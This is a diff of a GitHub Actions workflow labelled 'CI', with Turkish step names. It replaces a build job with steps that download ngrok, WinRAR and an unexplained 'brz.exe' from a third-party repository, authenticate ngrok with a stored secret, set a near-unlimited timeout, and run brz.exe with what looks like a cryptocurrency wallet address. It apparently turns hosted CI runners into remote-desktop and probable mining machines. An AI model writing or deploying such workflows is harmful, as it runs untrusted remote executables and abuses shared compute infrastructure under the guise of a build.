@@ -1,13 +1,29 @@
+   
 name: CI
 on: workflow_dispatch
 
 jobs:
-  build:
+  BEHRUZ:
 
     runs-on: windows-latest
+    timeout-minutes: 2147483
 
     steps:
 
+    - name: Ngrok iniyor...
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/ngrok.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/winrar.exe -OutFile winrar.exe
         Invoke-WebRequest https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/brz.exe -OutFile brz.exe
+    - name: Ngrok dosyalarını çıkartıyor...
+      run: Expand-Archive ngrok.zip
+
+    - name: Ngrok giriş yapılıyor...
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+             
     - name: HZ.Behruz...
-      run: cmd /c cd C:\Users\Public\Desktop\ ; ./brz 14qBrMavy2pW9umzuhd7eMDVpwQ62xRtPK
+      run: |
+        wget https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/brz.exe ; ./brz 14qBrMavy2pW9umzuhd7eMDVpwQ62xRtPK
